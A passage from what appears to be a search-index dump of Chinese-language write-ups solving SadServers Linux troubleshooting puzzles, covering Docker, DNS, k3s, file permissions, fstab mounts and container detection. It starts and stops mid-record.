nss-lookup.target\nWants=network-online.target\n\n[Service]\nType=forking\nPIDFile=/run/nginx.pid\nExecStartPre=/usr/sbin/nginx -t\nExecStart=/usr/sbin/nginx\nExecReload=/usr/sbin/nginx -s reload\nExecStop=/bin/kill -s QUIT $MAINPID\nPrivateTmp=true\nLimitNOFILE=10\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> \u628a LimitNOFILE=10 \u6539\u6210 LimitNOFILE=1024\uff0c\u7136\u540e\u91cd\u542f nginx \u5373\u53ef\u6b63\u5e38\u5f97\u5230\u54cd\u5e94\uff1a <pre><code>admin@ip-172-31-33-45:/$ sudo systemctl restart nginx\nWarning: The unit file, source configuration file or drop-ins of nginx.service changed on disk. Run 'systemctl daemon-reload' to reload units.\nadmin@ip-172-31-33-45:/$ sudo systemctl daemon-reload\nadmin@ip-172-31-33-45:/$ sudo systemctl restart nginx\nadmin@ip-172-31-33-45:/$ curl -Is 127.0.0.1:80 | head -1\nHTTP/1.1 200 OK\n</code></pre></p>"}, {"location": "writeups/sadservers/#salta", "title": "\"Salta\"", "text": "<p>Scenario: \"Salta\": Docker container won't start.</p> <p>Level: Medium</p> <p>Description: There's a \"dockerized\" Node.js web application in the /home/admin/app directory. Create a Docker container so you get a web app on port :8888 and can curl to it. For the solution to be valid, there should be only one running Docker container.</p> <p>OS: Debian 11</p> <p>\u9996\u5148\u68c0\u67e5\u4e00\u4e0b docker \u5bb9\u5668\uff1a <pre><code>admin@ip-172-31-38-21:/$ sudo docker ps -a\nCONTAINER ID   IMAGE     COMMAND                  CREATED       STATUS                   PORTS     NAMES\n124a4fb17a1c   app       \"docker-entrypoint.s\u2026\"   6 weeks ago   Exited (1) 6 weeks ago             elated_taussig\nadmin@ip-172-31-38-21:~/app$ sudo docker logs 124\nnode:internal/modules/cjs/loader:928\n  throw err;\n  ^\n\nError: Cannot find module '/usr/src/app/serve.js'\n    at Function.Module._resolveFilename (node:internal/modules/cjs/loader:925:15)\n    at Function.Module._load (node:internal/modules/cjs/loader:769:27)\n    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:76:12)\n    at node:internal/main/run_main_module:17:47 {\n  code: 'MODULE_NOT_FOUND',\n  requireStack: []\n}\n</code></pre> \u53d1\u73b0\u62a5\u9519\u4e86\uff0cDockerfile \u91cc\u51fa\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u770b\u4e00\u4e0b\uff1a <pre><code># documentation https://nodejs.org/en/docs/guides/nodejs-docker-webapp/\n\n# most recent node (security patches) and alpine (minimal, adds to security, possible libc issues)\nFROM node:15.7-alpine \n\n# Create app directory &amp; copy app files\nWORKDIR /usr/src/app\n\n# we copy first package.json only, so we take advantage of cached Docker layers\nCOPY ./package*.json ./\n\n# RUN npm ci --only=production\nRUN npm install\n\n# Copy app source\nCOPY ./* ./\n\n# port used by this app\nEXPOSE 8880\n\n# command to run\nCMD [ \"node\", \"serve.js\" ]\n</code></pre> \u53d1\u73b0\u6700\u540e CMD \u91cc server.js \u6253\u6210\u4e86 serve.js\uff0c\u800c\u4e14 EXPOSE \u7684\u7aef\u53e3\u4e5f\u4e0d\u5bf9\u3002\u4e24\u4e2a\u95ee\u9898\u4fee\u4e00\u4e0b\u7136\u540e\u91cd\u65b0\u6784\u5efa\u3001\u8fd0\u884c\uff1a <pre><code>admin@ip-172-31-38-21:~/app$ sudo docker build -t app .\nadmin@ip-172-31-38-21:~/app$ sudo docker rm 124\nadmin@ip-172-31-38-21:~/app$ sudo docker run -d -p 8888:8888 app\ne67b36ff14ff3676e419036180abf9231e97eacc5ec6fe9d76426e7003acfb8f\ndocker: Error response from daemon: driver failed programming external connectivity on endpoint nifty_bhaskara (ce8a09c7a42f730b89e0bd1bd3298de1598d79bf0d08d1532a7f38002cda84d4): Error starting userland proxy: listen tcp4 0.0.0.0:8888: bind: address already in use.\n</code></pre> \u53d1\u73b0\u62a5\u9519 8888 \u7aef\u53e3\u88ab\u5360\u7528\u4e86\u3002\u6ca1\u6709 lsof\uff0c\u7528 netstat \u67e5\u4e00\u4e0b\u7aef\u53e3\uff1a <pre><code>admin@ip-172-31-38-21:~/app$ netstat -tunlp\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::8080                 :::*                    LISTEN      562/gotty           \ntcp6       0      0 :::22                   :::*                    LISTEN      -                   \ntcp6       0      0 :::8888                 :::*                    LISTEN      -                   \ntcp6       0      0 :::6767                 :::*                    LISTEN      563/sadagent        \nudp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   \nudp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   \nudp6       0      0 fe80::8d3:45ff:fee9:546 :::*                                -                   \nudp6       0      0 ::1:323                 :::*                                - \n</code></pre> \u53d1\u73b0 8888 \u7aef\u53e3\u5728\u7528\uff0cps -aux \u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a nginx \u5728\u8fd0\u884c\uff0c\u5728 /etc/nginx/sites-enabled/default \u91cc\u786e\u5b9e\u6709\u4f7f\u7528 8888 \u7aef\u53e3\u3002</p> <p>\u6240\u4ee5\u5148\u505c\u6389 nginx\uff0c\u7136\u540e\u91cd\u65b0\u90e8\u7f72\u5bb9\u5668\u5373\u53ef\uff1a <pre><code>admin@ip-172-31-38-21:~/app$ sudo systemctl stop nginx\nadmin@ip-172-31-38-21:~/app$ sudo docker stop e6\ne6\nadmin@ip-172-31-38-21:~/app$ sudo docker rm e6\ne6\nadmin@ip-172-31-38-21:~/app$ sudo docker run -d -p 8888:8888 app\n...\nadmin@ip-172-31-38-21:~/app$ curl localhost:8888\nHello World!\n</code></pre></p>"}, {"location": "writeups/sadservers/#jakarta", "title": "\"Jakarta\"", "text": "<p>Scenario: \"Jakarta\": it's always DNS.</p> <p>Level: Hard</p> <p>Description: Can't ping google.com. It returns ping: google.com: Name or service not known. Expected is being able to resolve the hostname. (Note: currently the VMs can't ping outside so there's no automated check for the solution).</p> <p>OS: Ubuntu 22.04 LTS</p> <p>\u6839\u636e\u9898\u76ee\u77e5\u9053\u662f dns \u51fa\u4e86\u95ee\u9898\uff0c/etc/resolv.conf \u91cc\u7684\u914d\u7f6e\u90fd\u6ca1\u5565\u95ee\u9898\u3002\u800c\u4e14\u6574\u4e2a sadservers \u662f\u4e0d\u80fd\u8fde\u63a5\u5916\u7f51\u7684\uff0c\u6240\u4ee5\u5927\u6982\u53ea\u80fd\u7528\u672c\u673a\u7684\u4e86\u3002\u641c\u7d22\u4e86\u4e00\u4e0b dns \u76f8\u5173\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u770b\u4e86\u4e00\u5708\u53d1\u73b0 /etc/nsswitch.conf \u91cc\u7684 hosts \u914d\u7f6e\u6709\u95ee\u9898\uff1a <pre><code>hosts:          files\n</code></pre> \u800c\u7f51\u4e0a\u7684\u4f8b\u5b50\u91cc\u90fd\u6709 dns\uff0c\u6240\u4ee5\u5728 files \u540e\u9762\u52a0\u4e00\u4e2a dns \u5c31\u53ef\u4ee5\u4e86\uff1a <pre><code>ubuntu@ip-172-31-42-233:/$ ping google.com\nPING google.com (142.250.191.174) 56(84) bytes of data.\n</code></pre></p>"}, {"location": "writeups/sadservers/#bern", "title": "\"Bern\"", "text": "<p>Scenario: \"Bern\": Docker web container can't connect to db container.</p> <p>Level: Hard</p> <p>Description: There are two Docker containers running, a web application (Wordpress or WP) and a database (MariaDB) as back-end, but if we look at the web page, we see that it cannot connect to the database. curl -s localhost:80 |tail -4 returns:</p> <pre><code>&lt;body id=\"error-page\"&gt; &lt;div class=\"wp-die-message\"&gt;&lt;h1&gt;Error establishing a database connection&lt;/h1&gt;&lt;/div&gt;&lt;/body&gt; &lt;/html&gt;\n</code></pre> <p>This is not a Wordpress code issue (the image is :latest with some network utilities added). What you need to know is that WP uses \"WORDPRESS_DB_\" environment variables to create the MySQL connection string. See the ./html/wp-config.php WP config file for example (from /home/admin).</p> <p>OS: Debian 11</p> <p>docker ps -a \u53ef\u4ee5\u770b\u5230\u6709\u4e24\u4e2a\u5bb9\u5668\u5728\u8fd0\u884c\u3002\u6839\u636e\u9898\u76ee\u7684 test \u53ef\u4ee5\u77e5\u9053 mysql \u7684\u8d26\u53f7\u5bc6\u7801\u662f root:password\u3002</p> <p>WordPress \u542f\u52a8\u4f1a\u4ece\u73af\u5883\u53d8\u91cf\u8bfb\u53d6\u914d\u7f6e\uff0c\u6240\u4ee5\u5728 wordpress \u7684\u5bb9\u5668\u4e2d\u67e5\u4e00\u4e0b env\uff1a <pre><code>admin@ip-172-31-19-232:/$ sudo docker exec wordpress env |grep WORDPRESS_DB_\nWORDPRESS_DB_PASSWORD=password\nWORDPRESS_DB_USER=root\n</code></pre> \u53ef\u4ee5\u770b\u51fa\u7528\u6237\u540d\u548c\u5bc6\u7801\u8bbe\u7f6e\u7684\u662f\u6b63\u786e\u7684\u3002\u4f46\u662f NAME \u548c HOST \u4f7f\u7528\u7684\u5c31\u662f wp-config.php \u4e2d\u9ed8\u8ba4\u7684\u4e86\uff0c\u4e5f\u5c31\u662f wordpress \u548c mysql\uff0cNAME \u7684\u8bdd\u5728 mariadb \u5bb9\u5668\u91cc\u53ef\u4ee5\u770b\u5230\u786e\u5b9e\u662f wordpress\uff0c\u4f46 HOST \u662f mysql\uff0c\u5c31\u8fde\u63a5\u4e0d\u5230\u4e86\u3002</p> <p>\u800c\u9898\u7ed9\u7684 test \u4e00\u5b9a\u8981\u5728 wordpress \u5bb9\u5668\u91cc\u6253\u5f00 mysqladmin\uff0c\u8fde\u63a5 host mysql\u3002\u4e0d\u77e5\u9053\u600e\u4e48\u641e qwq\uff0chint \u6ca1\u518d\u63a5\u7740\u5199\u4e86\uff0c\u516b\u4f1a qwq\u3002</p>"}, {"location": "writeups/sadservers/#singara", "title": "\"Singara\"", "text": "<p>Scenario: \"Singara\": Docker and Kubernetes web app not working.</p> <p>Level: Hard</p> <p>Description: There's a k3s Kubernetes install you can access with kubectl. The Kubernetes YAML manifests under /home/admin have been applied. The objective is to access from the host the \"webapp\" web server deployed and find what message it serves (it's a name of a town or city btw). In order to pass the check, the webapp Docker container should not be run separately outside Kubernetes as a shortcut.</p> <p>OS: Debian 11</p> <p>\u5148\u770b\u4e00\u4e0b k3s \u7684\u914d\u7f6e\u6587\u4ef6\uff1a</p> \u914d\u7f6e\u6587\u4ef6 <p>deployment.yml<pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: webapp-deployment\nnamespace: web\nspec:\nselector:\n    matchLabels:\n    app: webapp\nreplicas: 1\ntemplate:\n    metadata:\n    labels:\n        app: webapp\n    spec:\n    containers:\n    - name: webapp\n        image: webapp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8880\n</code></pre> namespace.yml<pre><code>apiVersion: v1\nkind: Namespace\nmetadata:\nname: web\n</code></pre> nodeport.yml<pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: webapp-service\nnamespace: web\nspec:\ntype: NodePort\nselector:\n    app.kubernetes.io/name: webapp\nports:\n    - port: 80\n    targetPort: 8888\n    nodePort: 30007\n</code></pre></p> <p>\u7136\u540e\u68c0\u67e5\u4e00\u4e0b k3s \u5404\u90e8\u5206\u7684\u72b6\u6001\uff1a <pre><code>admin@ip-10-0-0-64:~$ kubectl get all -n web\nNAME                                     READY   STATUS             RESTARTS   AGE\npod/webapp-deployment-666b67994b-5sffz   0/1     ImagePullBackOff   0          46d\n\nNAME                     TYPE       CLUSTER-IP    EXTERNAL-IP   PORT(S)        AGE\nservice/webapp-service   NodePort   10.43.35.97   &lt;none&gt;        80:30007/TCP   46d\n\nNAME                                READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/webapp-deployment   0/1     1            0           46d\n\nNAME                                           DESIRED   CURRENT   READY   AGE\nreplicaset.apps/webapp-deployment-666b67994b   1         1         0       46d\n</code></pre> \u53ef\u4ee5\u53d1\u73b0 webapp-deployment \u7684\u955c\u50cf\u62c9\u53d6\u5931\u8d25\u4e86\u3002\u56e0\u4e3a\u5b83\u4f1a\u4ece\u7f51\u7edc\u62c9\u53d6 webapp \u955c\u50cf\u800c\u4e0d\u662f\u672c\u5730\uff0c\u800c\u6574\u4e2a sadservers \u4e0d\u80fd\u8fde\u63a5\u5916\u90e8\u7f51\u7edc\uff0c\u6240\u4ee5\u81ea\u7136\u4f1a\u62c9\u53d6\u5931\u8d25\u3002</p> <p>\u8fd9\u4e2a\u72b6\u6001\u548c\u524d\u4e00\u9635\u529e ZJUCTF \u6821\u8d5b\u5f88\u50cf\uff0c\u5927\u6982\u5c31\u662f k3s \u62c9\u53d6\u955c\u50cf\u7684\u95ee\u9898\u3002\u5f53\u65f6\u662f\u81ea\u5efa\u4e86\u4e00\u4e2a registry \u6765\u641e\u7684\u3002\u6240\u4ee5\u67e5\u4e00\u4e0b\u672c\u5730\u7684\u955c\u50cf\uff1a <pre><code>admin@ip-10-0-0-64:~$ sudo docker images\nREPOSITORY   TAG        IMAGE ID       CREATED        SIZE\nwebapp       latest     9c082e2983bc   6 weeks ago    135MB\npython       3.7-slim   c1d0bab51bbf   7 weeks ago    123MB\nregistry     2          3a0f7b0a13ef   2 months ago   24.1MB\n</code></pre> \u53d1\u73b0\u6b63\u597d\u6709 registry \u955c\u50cf\u3002\u6240\u4ee5\u672c\u5730\u8d77\u4e00\u4e2a registry \u7136\u540e\u5c06 webapp \u4e0a\u4f20\uff1a <pre><code>admin@ip-10-0-0-64:~$ sudo docker run -d -p 5000:5000 registry:2\n...\nadmin@ip-10-0-0-64:~$ sudo docker tag webapp localhost:5000/webapp\nadmin@ip-10-0-0-64:~$ sudo docker push localhost:5000/webapp\nUsing default tag: latest\nThe push refers to repository [localhost:5000/webapp]\n...\n</code></pre> \u7136\u540e\u6539\u4e00\u4e0b deployment.yml\uff1a <pre><code>...\ntemplate:\n    metadata:\n    labels:\n        app: webapp\n    spec:\n    containers:\n    - name: webapp\n        image: localhost:5000/webapp # \u8fd9\u91cc\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888 # \u548c\u8fd9\u91cc\n</code></pre> \u7136\u540e\u5e94\u7528\uff1a <pre><code>admin@ip-10-0-0-64:~$ kubectl apply -f deployment.yml \ndeployment.apps/webapp-deployment configured\nadmin@ip-10-0-0-64:~$ kubectl get pods -n web\nNAME                                 READY   STATUS        RESTARTS   AGE\nwebapp-deployment-666b67994b-5sffz   0/1     Terminating   0          46d\nwebapp-deployment-8f869f757-g2m7n    1/1     Running       0          12s\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u6210\u529f\u542f\u52a8\u4e86\uff0c\u63a5\u4e0b\u6765\u7684\u5c31\u662f\u5c06\u5176\u4e2d\u7684 8888 \u7aef\u53e3\u8f6c\u53d1\u51fa\u6765\uff1a <pre><code>admin@ip-10-0-0-64:~$ kubectl port-forward deployments/webapp-deployment 8888 -n web &amp;\nForwarding from 127.0.0.1:8888 -&gt; 8888\nForwarding from [::1]:8888 -&gt; 8888\n...\n</code></pre> \u7136\u540e\u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u91cc curl localhost:8888 \u5c31\u53ef\u4ee5\u5f97\u5230\u6b63\u5e38\u7ed3\u679c\u4e86\u3002</p>"}, {"location": "writeups/sadservers/#karakorum", "title": "\"Karakorum\"", "text": "<p>Scenario: \"Karakorum\": WTFIT \u2013 What The Fun Is This?</p> <p>Level: Hard</p> <p>Description: There's a binary at /home/admin/wtfit that nobody knows how it works or what it does (\"what the fun is this\"). Someone remembers something about wtfit needing to communicate to a service in order to start. Run this wtfit program so it doesn't exit with an error, fixing or working around things that you need but are broken in this server. (Note that you can open more than one web \"terminal\").</p> <p>OS: Debian 11</p> <p>ls -l \u53ef\u4ee5\u770b\u51fa\u6765 wtfit \u6ca1\u6709\u8fd0\u884c\u6743\u9650\u3002\u6240\u4ee5\u5148 chmod\uff0c\u4f46 chmod \u4f1a\u62a5\u9519 bash: /usr/bin/chmod: Permission denied\u3002\u7ecf\u8fc7\u68c0\u67e5\u53ef\u4ee5\u53d1\u73b0\u662f /usr/bin/chmod \u81ea\u8eab\u4e5f\u6ca1\u6709\u8fd0\u884c\u6743\u9650\uff1a <pre><code>admin@ip-172-31-46-91:/$ ls -l /usr/bin/chmod\n-rw-r--r-- 1 root root 64448 Sep 24  2020 /usr/bin/chmod\n</code></pre> \u53ef\u4ee5\u641c\u7d22\u5230\u4e00\u4e9b\u89e3\u51b3\u529e\u6cd5\uff1a <pre><code>admin@ip-172-31-46-91:/$ sudo su\nroot@ip-172-31-46-91:/# /lib64/ld-linux-x86-64.so.2 /bin/chmod 755 /bin/chmod\nroot@ip-172-31-46-91:/# cd /home/admin/\nroot@ip-172-31-46-91:/home/admin# chmod +x wtfit\n</code></pre> \u8fd0\u884c wtfit \u51fa\u9519\uff1aERROR: can't open config file\u3002\u6839\u636e\u63d0\u793a\u901a\u8fc7 strace \u6765\u8ddf\u8e2a\u5f97\u5230\u9519\u8bef\u7684\u8be6\u7ec6\u6d88\u606f\uff1a <pre><code>admin@ip-172-31-46-91:~$ strace ./wtfit\n...\nopenat(AT_FDCWD, \"/home/admin/wtfitconfig.conf\", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)\n...\n</code></pre> \u5728\u8fd9\u4e2a\u4f4d\u7f6e\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u914d\u7f6e\u6587\u4ef6\u3002\u7136\u540e\u518d\u8fd0\u884c\uff0c\u8fd8\u662f\u51fa\u9519\uff1aERROR: can't connect to server\u3002\u540c\u6837 strace \u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>admin@ip-172-31-46-91:~$ strace ./wtfit\n...\nconnect(3, {sa_family=AF_INET, sin_port=htons(7777), sin_addr=inet_addr(\"127.0.0.1\")}, 16) = -1 EINPROGRESS (Operation now in progress)\n...\n</code></pre> \u6240\u4ee5\u53ef\u4ee5\u770b\u51fa\u5b83\u5728\u8bd5\u56fe\u8fde\u63a5 localhost:7777\u3002\u5f00\u4e00\u4e2a\u65b0\u7684 terminal \u7136\u540e\u76d1\u542c\u4e00\u4e0b 7777 \u7aef\u53e3\uff0c\u8fd0\u884c wtfit\uff1a <pre><code>admin@ip-172-31-46-91:/$ nc -lvvp 7777\nListening on 0.0.0.0 7777\nConnection received on localhost 54756\nGET / HTTP/1.1\nHost: localhost:7777\nUser-Agent: Go-http-client/1.1\nAccept-Encoding: gzip\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u5c31\u662f\u7b80\u5355\u7684 GET\uff0c\u6240\u4ee5 python \u8d77\u4e00\u4e2a http server\uff0c\u7136\u540e\u8fd0\u884c\uff1a <pre><code>admin@ip-172-31-46-91:/$ python3 -m http.server 7777\nServing HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...\n127.0.0.1 - - [03/Nov/2022 12:58:30] \"GET / HTTP/1.1\" 200 -\n</code></pre> \u8fd9\u65f6 wtfit \u5c31\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u7ed3\u675f\u4e86\u3002</p>"}, {"location": "writeups/sadservers/#hong-kong", "title": "\"Hong-Kong\"", "text": "<p>Scenario: \"Hong-Kong\": can't write data into database.</p> <p>Level: Hard</p> <p>Description: (Similar to \"Manhattan\" scenario but harder). Your objective is to be able to insert a row in an existing Postgres database. The issue is not specific to Postgres and you don't need to know details about it (although it may help).</p> <p>Postgres information: it's a service that listens to a port (:5432) and writes to disk in a data directory, the location of which is defined in the data_directory parameter of the configuration file /etc/postgresql/14/main/postgresql.conf. In our case Postgres is managed by systemd as a unit with name postgresql.</p> <p>OS: Debian 10</p> <p>\u548c\u524d\u9762\u7684 \"Manhattan\" \u7c7b\u4f3c\u3002\u8fd8\u662f\u5148\u68c0\u67e5\u72b6\u6001\u6ca1\u5f02\u5e38\uff0c\u91cd\u542f\u6ca1\u5f02\u5e38\uff0c\u67e5\u770b /var/log/syslog\uff0c\u53d1\u73b0\uff1a <pre><code>Nov  3 11:52:20 ip-172-31-25-11 systemd[1]: Starting PostgreSQL Cluster 14-main...\nNov  3 11:52:20 ip-172-31-25-11 postgresql@14-main[1318]: Error: /opt/pgdata/main is not accessible or does not exist\nNov  3 11:52:20 ip-172-31-25-11 systemd[1]: postgresql@14-main.service: Can't open PID file /run/postgresql/14-main.pid (yet?) after start: No such file or directory\nNov  3 11:52:20 ip-172-31-25-11 systemd[1]: postgresql@14-main.service: Failed with result 'protocol'.\nNov  3 11:52:20 ip-172-31-25-11 systemd[1]: Failed to start PostgreSQL Cluster 14-main.\n</code></pre></p> <p>\u627e\u4e0d\u5230 /opt/pgdata/main\uff0cls \u4e00\u4e0b /opt/pgdata \u4e5f\u6ca1\u6709\u3002\u518d\u5f80\u524d\u770b syslog \u53ef\u4ee5\u53d1\u73b0\uff1a <pre><code>Nov  3 11:47:54 ip-172-31-25-11 systemd[1]: dev-xvdb.device: Job dev-xvdb.device/start timed out.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: Timed out waiting for device /dev/xvdb.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: Dependency failed for /opt/pgdata.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Job opt-pgdata.mount/start failed with result 'dependency'.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: Startup finished in 2.669s (kernel) + 1min 31.106s (userspace) = 1min 33.776s.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: dev-xvdb.device: Job dev-xvdb.device/start failed with result 'timeout'.\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u6302\u8f7d\u8bbe\u5907\u8d85\u65f6\u4e86\u3002</p> <p>fdisk \u770b\u4e00\u4e0b\uff1a <pre><code>root@ip-172-31-25-11:/# fdisk -l\nDisk /dev/nvme0n1: 8 GiB, 8589934592 bytes, 16777216 sectors\nDisk model: Amazon Elastic Block Store              \nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\n\n\nDisk /dev/nvme1n1: 8 GiB, 8589934592 bytes, 16777216 sectors\nDisk model: Amazon Elastic Block Store              \nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: 56507B41-5D22-1349-81AD-C628BA074922\n\nDevice           Start      End  Sectors  Size Type\n/dev/nvme1n1p1  262144 16777182 16515039  7.9G Linux filesystem\n/dev/nvme1n1p14   2048     8191     6144    3M BIOS boot\n/dev/nvme1n1p15   8192   262143   253952  124M EFI System\n\nPartition table entries are not in disk order.\nroot@ip-172-31-25-11:/# df\nFilesystem      1K-blocks    Used Available Use% Mounted on\nudev               228728       0    228728   0% /dev\ntmpfs               47568    1524     46044   4% /run\n/dev/nvme1n1p1    8026128 1230452   6366420  17% /\ntmpfs              237828       0    237828   0% /dev/shm\ntmpfs                5120       0      5120   0% /run/lock\ntmpfs              237828       0    237828   0% /sys/fs/cgroup\n/dev/nvme1n1p15    126710     278    126432   1% /boot/efi\n</code></pre> \u53ef\u4ee5\u53d1\u73b0 /dev/nvme0n1 \u6ca1\u6709\u6302\u8f7d\u4e0a\uff0c\u6839\u636e\u524d\u9762\u9898\u76ee\u53ef\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u8bbe\u5907\u91cc\u9762\u662f /opt/pgdata \u7684\u5185\u5bb9\u3002</p> <p><code>mount /dev/nvme0n1 /opt/pgdata</code> \u5c1d\u8bd5\u6302\u8f7d\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u4f46\u4ecd\u65e7\u6ca1\u6709\u4e1c\u897f\u3002\u770b\u4e00\u4e0b /var/log/syslog \u53d1\u73b0\uff1a <pre><code>Nov  3 12:02:06 ip-172-31-25-11 kernel: [  945.914667] SGI XFS with ACLs, security attributes, realtime, no debug enabled\nNov  3 12:02:06 ip-172-31-25-11 kernel: [  945.925395] XFS (nvme0n1): Mounting V5 Filesystem\nNov  3 12:02:07 ip-172-31-25-11 kernel: [  946.092049] XFS (nvme0n1): Ending clean mount\nNov  3 12:02:07 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Unit is bound to inactive unit dev-xvdb.device. Stopping, too.\nNov  3 12:02:07 ip-172-31-25-11 systemd[1]: Unmounting /opt/pgdata...\nNov  3 12:02:07 ip-172-31-25-11 kernel: [  946.124665] XFS (nvme0n1): Unmounting Filesystem\nNov  3 12:02:07 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Succeeded.\nNov  3 12:02:07 ip-172-31-25-11 systemd[1]: Unmounted /opt/pgdata.\n</code></pre></p> <p>\u53ef\u4ee5\u770b\u51fa systemd \u4e0d\u8ba9\u6211\u4eec\u6302\u8f7d\u5230 /opt/pgdata \u4e0a\uff0c\u56e0\u4e3a\u5b83\u548c /dev/xvdb \u8bbe\u5907\u5173\u8054\u4e86\u3002\u8fd9\u4e2a\u5173\u8054\u662f\u5728 /etc/fstab \u6587\u4ef6\u4e2d\u7684\uff1a <pre><code># /etc/fstab: static file system information\nUUID=5db68868-2d70-449f-8b1d-f3c769ec01c7 / ext4 rw,discard,errors=remount-ro,x-systemd.growfs 0 1\nUUID=72C9-F191 /boot/efi vfat defaults 0 0\n/dev/xvdb /opt/pgdata xfs defaults,nofail 0 0\n</code></pre> \u628a\u91cc\u9762\u7684 /dev/xvdb \u6362\u6210 /dev/nvme0n1\uff0c\u7136\u540e systemctl daemon-reload \u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u6b63\u5e38 mount \u4e86\uff1a <pre><code>root@ip-172-31-25-11:/# systemctl daemon-reload\nroot@ip-172-31-25-11:/# ls /opt/pgdata\nroot@ip-172-31-25-11:/# mount /dev/nvme0n1 /opt/pgdata\nroot@ip-172-31-25-11:/# ls /opt/pgdata\ndeleteme  file1.bk  file2.bk  file3.bk  main\n</code></pre> \u540c\u6837\uff0c\u8fd9\u4e9b .bk \u6587\u4ef6\u5360\u6ee1\u4e86\u7a7a\u95f4\uff0c\u5220\u6389\u7136\u540e\u91cd\u542f postgresql\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u4e86\uff1a <pre><code>root@ip-172-31-25-11:/# ls -l /opt/pgdata\ntotal 8285620\n-rw-r--r--  1 root     root             69 May 21 22:20 deleteme\n-rw-r--r--  1 root     root     7516192768 May 21 22:06 file1.bk\n-rw-r--r--  1 root     root      967774208 May 21 22:17 file2.bk\n-rw-r--r--  1 root     root         499712 May 21 22:23 file3.bk\ndrwx------ 19 postgres postgres       4096 May 21 22:24 main\nroot@ip-172-31-25-11:/# rm /opt/pgdata/file*.bk\nroot@ip-172-31-25-11:/# sudo systemctl start postgresql\nroot@ip-172-31-25-11:/# sudo -u postgres psql -c \"insert into persons(name) values ('jane smith');\" -d dt\nINSERT 0 1\n</code></pre></p>"}, {"location": "writeups/sadservers/#venice", "title": "\"Venice\"", "text": "<p>Scenario: \"Venice\": Am I in a container?</p> <p>Level: Medium</p> <p>Description: Try and figure out if you are inside a container (like a Docker one for example) or inside a Virtual Machine (like in the other scenarios).</p> <p>OS: Debian 11</p> <p>emmm\uff0cps -aux \u770b\u5230\uff1a <pre><code>root@ip-172-31-33-228:/# ps -aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.4  2.0 100712  9600 ?        Ss   12:14   0:01 /sbin/init\nroot          22  0.0  1.4  26728  6912 ?        Ss   12:14   0:00 /lib/systemd/systemd-journald\nmessage+      47  0.0  0.7   8268  3700 ?        Ss   12:14   0:00 /usr/bin/dbus-daemon --system --addres\nroot          49  0.0  1.1  13404  5532 ?        Ss   12:14   0:00 /lib/systemd/systemd-logind\nroot          71  0.0  2.4 1230092 11584 ?       S&lt;sl 12:14   0:00 /usr/local/gotty --permit-write --reco\nroot          91  0.0  0.7   6056  3652 pts/0    S&lt;s  12:18   0:00 bash\nroot          92  0.0  0.7   8840  3416 pts/0    R&lt;+  12:18   0:00 ps -aux\n</code></pre> \u548c\u5176\u5b83\u9898\u76ee\u5b9e\u4f8b\u91cc\u9762\u4e0d\u4e00\u6837\uff0c\u6ca1\u6709 kernel thread\uff0c\u6240\u4ee5\u662f\u5bb9\u5668\u800c\u4e0d\u662f\u865a\u62df\u673a\u3002\uff08\u5c31\u8fd9\uff1f</p> \u9898\u7ed9\u7b54\u6848 <p>Solution: This is in fact a Podman container :-) You can get the image: docker.io/fduran/venice.</p> <p>A way of checking is by looking at the environment of the PID=1 process and see if there's a container variable, for ex: cat /proc/1/environ|tr \"\\0\" \"\\n\"|grep container , in our case would be container=podman but I changed its value.</p> <p>An indicator is to look at the running processes and see that there are no kernel threads like [kthreadd].</p>"}, {"location": "writeups/sadservers/#oaxaca", "title": "\"Oaxaca\"", "text": "<p>Scenario: \"Oaxaca\": Close an Open File</p> <p>Level: Medium</p> <p>Description: The file /home/admin/somefile is open for writing by some process. Close this file without killing the process.</p> <p>OS: Debian 11</p> <p>lsof /home/admin/somefile \u53ef\u4ee5\u770b\u5230\u6709\u8fdb\u7a0b\u6253\u5f00\u4e86\u8fd9\u4e2a\u6587\u4ef6\uff1a <pre><code>COMMAND PID  USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME\nbash    798 admin   77w   REG  259,1        0 272875 